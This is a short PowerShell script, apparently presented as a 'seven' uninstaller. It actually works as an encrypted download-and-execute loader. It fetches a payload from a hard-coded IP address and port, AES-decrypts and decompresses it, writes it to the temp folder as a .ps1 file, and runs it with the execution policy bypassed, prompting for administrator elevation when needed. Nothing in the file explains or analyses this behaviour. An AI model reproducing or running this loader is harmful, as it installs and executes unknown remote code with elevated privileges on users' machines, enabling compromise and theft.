$ErrorActionPreference = 'Stop'
[Net.ServicePointManager]::SecurityProtocol = 'Tls12'
$B = 'http://51.75.118.5:20216'
$T = 'tk-48232543-a9d6F'
$U = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) WindowsPowerShell/5.1.19041.1'
$s = [Security.Cryptography.SHA256]::Create()
$k = $s.ComputeHash([Text.Encoding]::UTF8.GetBytes("$T|$U"))
$v = $s.ComputeHash([Text.Encoding]::UTF8.GetBytes("$T|$U|iv"))[0..15]
$r = Invoke-RestMethod -UseBasicParsing "$B/s/$T/uninstall" -Headers @{ 'User-Agent' = $U; 'Cache-Control' = 'no-cache' } -TimeoutSec 20
$d = [Convert]::FromBase64String(($r.d, $r.c | Where-Object { $_ })[0])
$a = [Security.Cryptography.Aes]::Create()
$a.Mode = 'CBC'; $a.Padding = 'PKCS7'; $a.Key = $k; $a.IV = $v
$p = $a.CreateDecryptor().TransformFinalBlock($d, 0, $d.Length)
$m = [IO.MemoryStream]::new($p)
$g = [IO.Compression.GZipStream]::new($m, [IO.Compression.CompressionMode]::Decompress)
$o = [IO.MemoryStream]::new()
$g.CopyTo($o); $g.Dispose()
$f = Join-Path $env:TEMP 'seven-uninstall.ps1'
[IO.File]::WriteAllBytes($f, $o.ToArray())
$adm = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole('Administrator')
if ($adm) { & powershell -NoProfile -ExecutionPolicy Bypass -File $f }
else { Start-Process powershell -Verb RunAs -ArgumentList @('-NoProfile','-ExecutionPolicy','Bypass','-File',$f) }
